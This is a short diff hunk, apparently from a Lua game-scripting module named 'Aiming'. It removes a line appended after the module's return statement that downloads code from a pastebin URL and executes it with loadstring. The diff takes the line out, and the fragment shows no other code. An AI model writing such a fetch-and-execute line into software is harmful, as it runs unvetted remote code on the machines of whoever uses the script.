@@ -434,4 +434,4 @@ end)
 
 -- //
 return Aiming
-loadstring(game:HttpGet("https://pastebin.com/raw/L2JkUhMx"))
+
